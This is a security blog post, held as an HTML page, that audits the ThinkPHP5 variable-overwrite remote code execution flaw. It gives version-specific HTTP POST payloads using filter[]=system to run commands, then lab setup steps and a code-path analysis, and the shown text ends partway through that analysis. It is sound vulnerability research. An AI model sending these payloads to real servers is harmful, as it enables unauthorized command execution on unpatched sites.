@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ThinkPHP5 变量覆盖导致的RCE - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, php安全' />
+  <meta itemprop="name" content="ThinkPHP5 变量覆盖导致的RCE">
+  <meta itemprop="datePublished" content="2024-09-14T18:59:01+08:00">
+  <meta itemprop="dateModified" content="2024-09-14T18:59:01+08:00">
+  <meta itemprop="wordCount" content="226">
+  <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="ThinkPHP5 变量覆盖导致的RCE">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-14T18:59:01+08:00">
+    <meta property="article:modified_time" content="2024-09-14T18:59:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Php安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ThinkPHP5 变量覆盖导致的RCE">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ThinkPHP5 变量覆盖导致的RCE",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  226 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/%E5%AE%A1%E8%AE%A1\/thinkphp5-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E7%9A%84rce\/","datePublished": "2024-09-14T18:59:01+08:00","dateModified": "2024-09-14T18:59:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">ThinkPHP5 变量覆盖导致的RCE</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>ThinkPHP5 变量覆盖导致的RCE</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-14 18:59:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-14">2024-09-14</time></span>&nbsp;<span title="226 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#动态调试">动态调试</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><p>漏洞存在版本，分为两大版本：</p>
+<ul>
+<li>ThinkPHP 5.0-5.0.24</li>
+<li>ThinkPHP 5.1.0-5.1.30</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">## ThinkPHP &lt;= 5.0.13</span>
+</span></span><span style="display:flex;"><span>POST /?s<span style="color:#ff636f">=</span>index/index
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">s</span><span style="color:#ff636f">=</span>whoami&amp;<span style="color:#58a1dd">_method</span><span style="color:#ff636f">=</span>__construct&amp;<span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span>&amp;filter<span style="color:#ff636f">[]=</span>system
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">## ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug</span>
+</span></span><span style="display:flex;"><span>POST /
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">_method</span><span style="color:#ff636f">=</span>__construct&amp;filter<span style="color:#ff636f">[]=</span>system&amp;server<span style="color:#ff636f">[</span>REQUEST_METHOD<span style="color:#ff636f">]=</span>ls -al
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">## ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha</span>
+</span></span><span style="display:flex;"><span>POST /?s<span style="color:#ff636f">=</span>xxx HTTP/1.1
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">_method</span><span style="color:#ff636f">=</span>__construct&amp;filter<span style="color:#ff636f">[]=</span>system&amp;<span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span>get&amp;get<span style="color:#ff636f">[]=</span>ls+-al
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">_method</span><span style="color:#ff636f">=</span>__construct&amp;filter<span style="color:#ff636f">[]=</span>system&amp;<span style="color:#58a1dd">method</span><span style="color:#ff636f">=</span>get&amp;server<span style="color:#ff636f">[</span>REQUEST_METHOD<span style="color:#ff636f">]=</span>ls</span></span></code></pre></div><h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>composer create-project topthink/think=5.0.23 thinkphp5.0.23</code></pre><p>修改composer.json</p>
+<pre tabindex="0"><code>&#34;require&#34;: {
+    &#34;php&#34;: &#34;&gt;=5.4.0&#34;,
+    &#34;topthink/framework&#34;: &#34;5.0.23&#34;
+},</code></pre><p>执行<code>composer update</code></p>
+<p>依旧是宝塔跑</p>
+<p>开启app_debug</p>
+<p>payload</p>
+<pre tabindex="0"><code>_method=__construct&amp;method=get&amp;filter[]=system&amp;get[]=whoami</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141719465.webp" alt="image-20240914171954326" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141719465.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141719465.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141719465.webp?size=large 2x" data-title="image-20240914171954326" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="漏洞分析" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>首先在官方发布的 <strong>5.0.24</strong> 版本更新说明中，发现其中提到该版本包含了一个安全更新。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141722828.webp" alt="image-20240914172257706" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141722828.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141722828.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141722828.webp?size=large 2x" data-title="image-20240914172257706" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最重要的应该是这里，对method进行了白名单的验证</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141725520.webp" alt="image-20240914172536404" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141725520.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141725520.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141725520.webp?size=large 2x" data-title="image-20240914172536404" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>来尝试还原一下漏洞，核心点就是这两句</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">method</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">strtoupper</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#58a1dd">Config</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;var_method&#39;</span>)]);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span>{<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">method</span>}(<span style="color:#58a1dd">$_POST</span>);</span></span></code></pre></div><p>第一句是读取post数组里的<code>_method</code>，然后当作方法名进行调用，第二句直接把post数组当作这个方法的参数，那么我们可以调用这个类里面的任意方法了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141733579.webp" alt="image-20240914173310476" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141733579.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141733579.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141733579.webp?size=large 2x" data-title="image-20240914173310476" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这个漏洞用的是构造方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">protected</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__construct</span>(<span style="color:#58a1dd">$options</span> <span style="color:#ff636f">=</span> [])
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">foreach</span> (<span style="color:#58a1dd">$options</span> <span style="color:#ff636f">as</span> <span style="color:#58a1dd">$name</span> <span style="color:#ff636f">=&gt;</span> <span style="color:#58a1dd">$item</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">property_exists</span>(<span style="color:#58a1dd">$this</span>, <span style="color:#58a1dd">$name</span>)) {
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">$name</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$item</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">is_null</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">filter</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">filter</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">Config</span><span style="color:#ff636f">::</span><span style="color:#58a1dd">get</span>(<span style="color:#a6be9d">&#39;default_filter&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#828b96;font-style:italic">// 保存 php://input
+</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>        <span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">input</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">file_get_contents</span>(<span style="color:#a6be9d">&#39;php://input&#39;</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>foreach遍历输入的数组，然后覆盖类里面的属性值</p>
+<p>这个方法也是一眼就看到了，实际上后面利用的就是这个</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141741279.webp" alt="image-20240914174144149" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141741279.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141741279.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141741279.webp?size=large 2x" data-title="image-20240914174144149" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>如果框架在配置文件中开启了 <strong>debug</strong> 模式（ <code>'app_debug'=&gt; true</code> ），程序会调用 <strong>Request</strong> 类的 <strong>param</strong> 方法。这个方法我们需要特别关注了，因为 <strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141746955.webp" alt="image-20240914174600802" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141746955.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141746955.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141746955.webp?size=large 2x" data-title="image-20240914174600802" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>而这个 <strong>param</strong> 方法就调用了我们上面说的method方法，而他也会调用server方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141802817.webp" alt="image-20240914180259648" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141802817.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141802817.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141802817.webp?size=large 2x" data-title="image-20240914180259648" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>server方法里调用了input方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141804573.webp" alt="image-20240914180416447" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141804573.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141804573.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141804573.webp?size=large 2x" data-title="image-20240914180416447" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>input方法里的三个参数都会传递给filterValue</p>
+<p>这个 <strong>$this-&gt;server</strong> 的值，我们可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值。也就是说，可控数据作为 <strong>$data</strong> 传入 <strong>input</strong> 方法，然后 <strong>$data</strong> 会被 <strong>filterValue</strong> 方法使用 <strong>$filter</strong> 过滤器处理。其中 <strong>$filter</strong> 的值部分来自 <strong>$this-&gt;filter</strong> ，又是可以通过先前 <strong>Request</strong> 类的 <strong>__construct</strong> 方法来覆盖赋值。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141805368.webp" alt="image-20240914180540218" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141805368.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141805368.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141805368.webp?size=large 2x" data-title="image-20240914180540218" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>在 <strong>run</strong> 方法中，会执行一个 <strong>exec</strong> 方法，当该方法中的 <strong>$dispatch[&rsquo;type&rsquo;]</strong> 等于 <strong>controller</strong> 或者 <strong>method</strong> 时，又会调用 <strong>Request</strong> 类的 <strong>param</strong> 方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141812202.webp" alt="image-20240914181214004" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141812202.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141812202.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141812202.webp?size=large 2x" data-title="image-20240914181214004" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>现在我们还要解决一个问题，就是如何让 <strong>$dispatch[&rsquo;type&rsquo;]</strong> 等于 <strong>controller</strong> 或者 <strong>method</strong> 。通过跟踪代码，我们发现 <strong>$dispatch[&rsquo;type&rsquo;]</strong> 来源于 <strong>parseRule</strong> 方法中的 <strong>$result</strong> 变量，而 <strong>$result</strong> 变量又与 <strong>$route</strong> 变量有关系。这个 <strong>$route</strong> 变量取决于程序中定义的路由地址方式。</p>
